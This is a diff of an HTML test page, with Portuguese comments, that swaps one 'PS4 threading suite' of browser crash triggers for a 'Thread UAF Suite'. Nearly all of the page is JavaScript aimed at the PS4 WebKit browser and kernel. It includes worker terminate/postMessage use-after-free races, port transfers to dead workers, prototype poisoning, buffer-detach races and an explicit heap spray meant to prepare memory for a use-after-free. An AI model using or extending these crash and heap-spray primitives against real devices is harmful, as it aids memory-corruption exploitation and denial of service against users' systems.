@@ -2,323 +2,238 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Threading & SharedWorker Suite v22000</title>
+<title>PS4 Thread UAF Suite v23000</title>
 </head>
 <body>
 
-<h1>SUITE V22000: SHAREDWORKER & PTHREAD RACE</h1>
-<p>Target: libkernel Pthread Synchronization & WebKit IPC</p>
+<h1>SUITE V23000: THREAD LIFECYCLE UAF</h1>
+<p>Focus: Race Conditions on Thread Termination (Not Exhaustion)</p>
 <hr>
 
-<button onclick="crashSharedWorkerLife()">01. SharedWorker Connect/Terminate Race (IPC UAF)</button>
+<button onclick="crashWorkerTerminateRace()">01. Worker.terminate() vs postMessage() Race (UAF)</button>
 
-<button onclick="crashPortThreadTransfer()">02. MessagePort Transfer between SharedWorker & Worker (Locking Panic)</button>
+<button onclick="crashPortEntangle()">02. MessagePort Transfer to Terminated Worker</button>
 
-<button onclick="crashBroadcastThread()">03. BroadcastChannel Multi-Thread Message Flood (Kernel Mbuf Race)</button>
+<button onclick="crashNestedGhost()">03. Nested Worker Destruction Race</button>
 
-<button onclick="crashBlobThreadRevoke()">04. SharedWorker Fetch vs Main Thread Revoke (VFS Panic)</button>
+<button onclick="crashBlobStorm()">04. Worker Script Loading vs Blob Revocation</button>
 
-<button onclick="crashIDBThreading()">05. IndexedDB Transaction Commit Race across Threads</button>
+<button onclick="crashProtoThread()">05. Object Prototype Poisoning across Threads</button>
 
-<button onclick="crashPthreadScheduler()">06. Worker Spawning Bomb (Kernel Scheduler Starvation)</button>
+<button onclick="crashEventListenerUAF()">06. Worker 'error' Event Listener UAF</button>
 
-<button onclick="crashObjectCloneRace()">07. Structured Clone Deep Object Transfer Race</button>
+<button onclick="crashFloatDetach()">07. Float32Array Transfer Race (No SharedArrayBuffer)</button>
 
-<button onclick="crashWorkerNameCollision()">08. SharedWorker Constructor Name Collision Logic Error</button>
+<button onclick="crashBitmapRace()">08. ImageBitmap Transfer to Dying Worker</button>
 
-<button onclick="crashTextEncoderThread()">09. TextEncoder Internal Buffer Race (ICU Lib Threading)</button>
+<button onclick="crashRecursiveTransfer()">09. Deeply Nested Object Transfer Recursion</button>
 
-<button onclick="crashChannelEntangle()">10. MessageChannel Ring Entanglement across Threads</button>
+<button onclick="crashSpray()">10. Heap Spray (Prepare Memory for UAF)</button>
 
 <div id="log" style="border: 1px solid #000; height: 300px; overflow: auto; white-space: pre-wrap; font-family: monospace;"></div>
 
 <script>
     function log(msg) {
-        document.getElementById('log').innerText += "\n[THREAD] " + msg;
+        document.getElementById('log').innerText += "\n[LOG] " + msg;
     }
 
-    // Helper: Cria código de SharedWorker via Blob
-    function createSharedWorkerBlob(script) {
-        try {
-            const blob = new Blob([script], {type: 'application/javascript'});
-            return URL.createObjectURL(blob);
-        } catch(e) { return null; }
-    }
-
-    // 01. SharedWorker Connect/Terminate Race
-    // Alvo: Pthread Management no Kernel.
-    // Conectar e desconectar portas rapidamente estressa o IPC (Inter-Process Communication).
-    function crashSharedWorkerLife() {
-        const url = createSharedWorkerBlob(`
-            onconnect = function(e) {
-                const port = e.ports[0];
-                port.onmessage = function(e) {
-                    if(e.data === 'die') close();
-                }
-                port.start();
-            }
-        `);
-        
-        if(!url) return log("Blob URL failed");
-
-        // Loop de conexão rápida
-        const iv = setInterval(() => {
-            try {
-                const sw = new SharedWorker(url, "crash-pool");
-                sw.port.start();
-                sw.port.postMessage("die"); // Pede para morrer
-                
-                // Tenta enviar mensagem para porta morta imediatamente
-                sw.port.postMessage("UAF?");
-            } catch(e) {}
-        }, 10);
-        
-        setTimeout(() => { clearInterval(iv); URL.revokeObjectURL(url); }, 2000);
-    }
-
-    // 02. MessagePort Transfer between SharedWorker & Worker
-    // Alvo: Transferência de Ownership de portas entre diferentes tipos de Threads.
-    function crashPortThreadTransfer() {
-        const swUrl = createSharedWorkerBlob(`
-            onconnect = function(e) {
-                const port = e.ports[0];
-                port.onmessage = function(msg) {
-                    // Recebe porta e tenta postar nela imediatamente
-                    const p = msg.data;
-                    if(p) p.postMessage("Pthread Hello");
-                }
-                port.start();
-            }
-        `);
-        
-        const wUrl = URL.createObjectURL(new Blob([`
-            onmessage = function(e) {
-                const port = e.data;
-                // Transfere a porta recebida para o nada (gc)
-                postMessage("done", [port]); 
-            }
-        `], {type:'text/javascript'}));
-
-        const sw = new SharedWorker(swUrl, "port-race");
-        const w = new Worker(wUrl);
-        
-        sw.port.start();
-
-        // Cria canal
-        const ch = new MessageChannel();
-        
-        // Race: Envia porta 1 para SharedWorker e Porta 2 para Worker normal
-        // Tenta confundir o lock de portas no kernel
-        sw.port.postMessage(ch.port1, [ch.port1]);
-        w.postMessage(ch.port2, [ch.port2]);
-    }
-
-    // 03. BroadcastChannel Multi-Thread Message Flood
-    // Alvo: Kernel Mbufs (Memory Buffers de Rede/IPC).
-    // Múltiplas threads escrevendo no mesmo canal sem controle de fluxo.
-    function crashBroadcastThread() {
-        const channelName = "kernel_panic_tv";
-        const bcMain = new BroadcastChannel(channelName);
-        
-        const script = `
-            const bc = new BroadcastChannel("${channelName}");
-            // Flood loop
-            setInterval(() => {
-                // Payload de 4KB
-                bc.postMessage(new Uint8Array(4096).fill(0xCC));
-            }, 1);
-        `;
-
-        // Spawna 4 Workers para bombardear o canal
-        for(let i=0; i<4; i++) {
-            new Worker(URL.createObjectURL(new Blob([script], {type:'text/javascript'})));
-        }
-        
-        // Main thread tenta ler e fechar
-        bcMain.onmessage = () => {
-            // Fecha canal aleatoriamente para causar escrita em handle fechado
-            if(Math.random() > 0.99) {
-                bcMain.close();
-                log("Main BC closed");
-            }
-        };
-    }
-
-    // 04. SharedWorker Fetch vs Main Thread Revoke
-    // Alvo: VFS (Virtual File System) Locking.
-    function crashBlobThreadRevoke() {
-        const hugeData = new Uint8Array(1024 * 1024 * 5); // 5MB
-        const blob = new Blob([hugeData]);
-        const blobUrl = URL.createObjectURL(blob);
-        
-        const swUrl = createSharedWorkerBlob(`
-            onconnect = function(e) {
-                const port = e.ports[0];
-                port.onmessage = function(msg) {
-                    // Tenta ler o Blob URL enviado
-                    fetch(msg.data).then(r => r.arrayBuffer());
-                }
-                port.start();
-            }
-        `);
-
-        const sw = new SharedWorker(swUrl, "blob-killer");
-        sw.port.start();
-        
-        // Envia URL para thread background
-        sw.port.postMessage(blobUrl);
-        
-        // Revoga imediatamente na Main Thread
-        // Race condition: Thread A lê inode, Thread B deleta inode
-        setTimeout(() => {
-            URL.revokeObjectURL(blobUrl);
-            log("Revoked in Main");
-        }, 0);
-    }
-
-    // 05. IndexedDB Transaction Commit Race across Threads
-    // Alvo: SQLite/LevelDB backend do WebKit (File locking).
-    function crashIDBThreading() {
-        const req = indexedDB.open("ThreadDB", 1);
-        req.onupgradeneeded = (e) => {
-            e.target.result.createObjectStore("store");
-        };
-        req.onsuccess = (e) => {
-            const db = e.target.result;
-            db.close();
-            
-            const script = `
-                const r = indexedDB.open("ThreadDB", 1);
-                r.onsuccess = (ev) => {
-                    const db = ev.target.result;
-                    // Transaction Flood
-                    setInterval(() => {
-                        const tx = db.transaction("store", "readwrite");
-                        tx.objectStore("store").put("data", Math.random());
-                    }, 0);
-                }
-            `;
-            
-            // 2 Workers lutando pelo lock do banco
-            new Worker(URL.createObjectURL(new Blob([script], {type:'text/javascript'})));
-            new Worker(URL.createObjectURL(new Blob([script], {type:'text/javascript'})));
-        };
-    }
-
-    // 06. Worker Spawning Bomb (Pthread Scheduler)
-    // Alvo: Limite de Pthreads do processo WebKit.
-    function crashPthreadScheduler() {
-        // Tenta criar workers até o limite do sistema
-        // Se o tratamento de erro de "Resource exhausted" for ruim, causa Panic.
-        const blob = new Blob(["setInterval(()=>{}, 1000)"], {type:'text/javascript'});
+    // 01. Worker Terminate Race
+    // ALVO: Tentar usar a estrutura da thread (struct thread) no kernel logo após chamar terminate().
+    // Se o kernel liberar a memória da thread mas uma mensagem ainda estiver na fila...
+    function crashWorkerTerminateRace() {
+        const blob = new Blob(["onmessage=function(e){ postMessage(e.data); }"], {type:'text/javascript'});
         const url = URL.createObjectURL(blob);
         
-        const workers = [];
+        const w = new Worker(url);
+        const ab = new ArrayBuffer(1024); // Payload
+        
+        // Envia mensagem
+        w.postMessage(ab);
+        
+        // RACE: Termina o worker imediatamente.
+        // O Kernel começa a destruir a thread.
+        w.terminate();
+        
+        // Tenta enviar outra mensagem para a thread "zumbi"
+        // Se a validação de handle falhar, pode escrever em memória livre.
         try {
-            for(let i=0; i<500; i++) {
-                workers.push(new Worker(url));
-            }
-        } catch(e) {
-            log("Limit hit: " + e.message);
-            // Agora mata todos de uma vez para estressar o cleanup de threads
-            workers.forEach(w => w.terminate());
-        }
+            for(let i=0; i<1000; i++) w.postMessage(ab);
+        } catch(e) {}
     }
 
-    // 07. Structured Clone Deep Object Transfer Race
-    // Alvo: Serializador de Objetos IPC.
-    function crashObjectCloneRace() {
-        // Cria objeto profundo
-        let o = { a: 1 };
-        for(let i=0; i<2000; i++) o = { next: o, val: i };
+    // 02. MessagePort Transfer to Terminated Worker
+    // ALVO: IPC (Inter-Process Communication).
+    // Transferir uma porta (Recurso Kernel) para um processo que não existe mais.
+    function crashPortEntangle() {
+        const ch = new MessageChannel();
+        const blob = new Blob(["onmessage=()=>{}"], {type:'text/javascript'});
+        const w = new Worker(URL.createObjectURL(blob));
         
-        const swUrl = createSharedWorkerBlob(`
-            onconnect = function(e) {
-                const p = e.ports[0];
-                p.onmessage = function(m) {
-                    // Recebe e manda de volta (Double Cloning)
-                    p.postMessage(m.data);
-                }
-                p.start();
-            }
-        `);
+        w.terminate(); // Mata o destino
         
-        const sw = new SharedWorker(swUrl, "clone-war");
-        sw.port.start();
-        
-        // Envia objeto massivo para causar lag na serialização
-        sw.port.postMessage(o);
-        
-        // Tenta fechar a porta durante a serialização
-        setTimeout(() => sw.port.close(), 1);
+        // Pequeno delay para garantir que o estado de morte iniciou
+        setTimeout(() => {
+            try {
+                // Tenta transferir a porta para o worker morto
+                // O Kernel tenta anexar a porta ao processo ID do worker. Se o ID sumiu ou foi reutilizado...
+                w.postMessage("ghost", [ch.port2]);
+            } catch(e) {}
+        }, 1);
     }
 
-    // 08. SharedWorker Name Collision Logic Error
-    // Alvo: SharedWorkerManager (C++).
-    function crashWorkerNameCollision() {
-        const url1 = createSharedWorkerBlob("console.log('A')");
-        const url2 = createSharedWorkerBlob("console.log('B')");
+    // 03. Nested Worker Destruction Race
+    // ALVO: Hierarquia de Processos.
+    // Matar o pai enquanto o filho ainda está inicializando.
+    function crashNestedGhost() {
+        const childCode = "setInterval(()=>{}, 100)";
+        const childBlob = new Blob([childCode], {type:'text/javascript'});
+        const childUrl = URL.createObjectURL(childBlob);
         
-        // A especificação diz: Mesmo nome + URL diferente = Erro.
-        // Se implementado incorretamente, pode corromper o mapa de workers ativos.
-        try {
-            const sw1 = new SharedWorker(url1, "CollisionTest");
-            const sw2 = new SharedWorker(url2, "CollisionTest"); // Deve falhar
-        } catch(e) {
-            log("Collision detected (Safe)");
-        }
-    }
-
-    // 09. TextEncoder Internal Buffer Race
-    // Alvo: Biblioteca ICU compartilhada (Thread safety issues).
-    function crashTextEncoderThread() {
-        const u8 = new Uint8Array(1024*1024);
-        
-        const script = `
-            const enc = new TextEncoder();
-            onmessage = function(e) {
-                // Codifica massivamente
-                const buf = e.data;
-                for(let i=0; i<100; i++) enc.encode(new Uint8Array(buf));
-            }
+        const parentCode = `
+            const w = new Worker("${childUrl}");
+            postMessage("spawned");
         `;
+        const parentBlob = new Blob([parentCode], {type:'text/javascript'});
+        const parentUrl = URL.createObjectURL(parentBlob);
         
-        const w1 = new Worker(URL.createObjectURL(new Blob([script], {type:'text/javascript'})));
-        const w2 = new Worker(URL.createObjectURL(new Blob([script], {type:'text/javascript'})));
+        const parent = new Worker(parentUrl);
         
-        // Envia Buffers Transferable para criar pressão no alocador
-        // Tentando corromper o estado global do ICU se ele não usar Thread Local Storage corretamente
-        const ab1 = u8.buffer.slice(0);
-        const ab2 = u8.buffer.slice(0);
-        
-        w1.postMessage(ab1, [ab1]);
-        w2.postMessage(ab2, [ab2]);
+        parent.onmessage = () => {
+            // Assim que o filho nasce, matamos o pai.
+            // O filho fica órfão? O Kernel limpa recursivamente?
+            parent.terminate();
+            
+            // Tenta forçar GC
+            const junk = new Array(10000).fill(1);
+        };
     }
 
-    // 10. MessageChannel Ring Entanglement across Threads
-    // Alvo: Deadlock ou Stack Overflow no Kernel IPC.
-    function crashChannelEntangle() {
-        const swUrl = createSharedWorkerBlob(`
-            onconnect = function(e) {
-                let port = e.ports[0];
-                port.onmessage = function(msg) {
-                    // Recebe nova porta, conecta na antiga
-                    const newPort = msg.data;
-                    port.postMessage("hook", [newPort]);
-                }
-                port.start();
+    // 04. Worker Script Loading vs Blob Revocation
+    // ALVO: Race condition no carregamento de script (VFS).
+    function crashBlobStorm() {
+        const blob = new Blob(["console.log('race')"], {type:'text/javascript'});
+        const url = URL.createObjectURL(blob);
+        
+        // Inicia carregamento
+        const w = new Worker(url);
+        
+        // Revoga URL imediatamente
+        // O WebKit tenta ler o script, mas o Kernel deletou o handle do arquivo virtual.
+        URL.revokeObjectURL(url);
+        
+        // Tenta reiniciar worker com url inválida
+        try {
+            w.terminate();
+            new Worker(url);
+        } catch(e) {}
+    }
+
+    // 05. Object Prototype Poisoning across Threads
+    // ALVO: JSC Object Internals.
+    // Workers compartilham estruturas de código (CodeBlocks) mas não heap.
+    // Tentar confundir a estrutura de objetos transferidos.
+    function crashProtoThread() {
+        const w = new Worker(URL.createObjectURL(new Blob([`
+            onmessage = function(e) {
+                const obj = e.data;
+                // Tenta ler propriedade que pode ter sido otimizada fora
+                const val = obj.id;
             }
-        `);
+        `], {type:'text/javascript'})));
         
-        const sw = new SharedWorker(swUrl, "ring");
-        sw.port.start();
+        const obj = { id: 1 };
+        // Polui o protótipo na main thread
+        Object.defineProperty(Object.prototype, 'id', {
+            get: () => { return 0x41414141; }
+        });
         
-        // Cria um anel de portas distribuído entre threads
-        // Main -> SW -> Main -> SW ...
-        for(let i=0; i<100; i++) {
-            const ch = new MessageChannel();
-            sw.port.postMessage(ch.port2, [ch.port2]);
+        w.postMessage(obj);
+    }
+
+    // 06. Worker 'error' Event Listener UAF
+    // ALVO: EventDispatcher C++.
+    function crashEventListenerUAF() {
+        const w = new Worker(URL.createObjectURL(new Blob(["throw 'crash'"], {type:'text/javascript'})));
+        
+        function handler() {
+            // Quando o erro ocorre, matamos o worker e removemos o listener
+            w.terminate();
+            w.removeEventListener('error', handler);
+            
+            // Alocação para preencher o vazio
+            const arr = new Uint32Array(1024);
+            arr.fill(0x1337);
         }
+        
+        w.addEventListener('error', handler);
+    }
+
+    // 07. Float32Array Transfer Race (No SAB)
+    // ALVO: ArrayBuffer Neutering.
+    function crashFloatDetach() {
+        const ab = new ArrayBuffer(1024 * 1024);
+        const f32 = new Float32Array(ab);
+        
+        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{}"], {type:'text/javascript'})));
+        
+        // Agenda transfer
+        setTimeout(() => w.postMessage(ab, [ab]), 0);
+        
+        // Loop de leitura na Main Thread
+        // Espera-se que o buffer suma debaixo dos pés do JS
+        const start = Date.now();
+        while(Date.now() - start < 200) {
+            if (f32.length > 0) {
+                f32[0] = 1.1;
+            }
+        }
+    }
+
+    // 08. ImageBitmap Transfer to Dying Worker
+    // ALVO: Graphics Resource Management.
+    // Bitmaps são recursos de GPU/Memória. Transferir para thread morta pode vazar o recurso.
+    function crashBitmapRace() {
+        const c = document.createElement('canvas');
+        c.width = 100; c.height = 100;
+        
+        createImageBitmap(c).then(bmp => {
+            const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
+            w.terminate();
+            
+            // Transferir Bitmap para worker fechado
+            try {
+                w.postMessage(bmp, [bmp]);
+            } catch(e) {}
+        });
+    }
+
+    // 09. Deeply Nested Object Transfer Recursion
+    // ALVO: Stack Overflow no Serializador de Mensagens (Structured Clone).
+    function crashRecursiveTransfer() {
+        let obj = { a: 1 };
+        // Cria profundidade para estourar a stack de serialização do Worker
+        for(let i=0; i<5000; i++) {
+            obj = { next: obj };
+        }
+        
+        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
+        try {
+            w.postMessage(obj);
+        } catch(e) {}
+    }
+
+    // 10. Heap Spray (Prepare Memory)
+    // ALVO: Preparar o terreno. Preenche a memória com padrões conhecidos.
+    function crashSpray() {
+        const spray = [];
+        const pattern = 0x41414141; // AAAA
+        for(let i=0; i<1000; i++) {
+            const ab = new ArrayBuffer(1024 * 64); // 64KB
+            const view = new Uint32Array(ab);
+            view.fill(pattern);
+            spray.push(ab);
+        }
+        log("Heap Sprayed.");
     }
 
 </script>
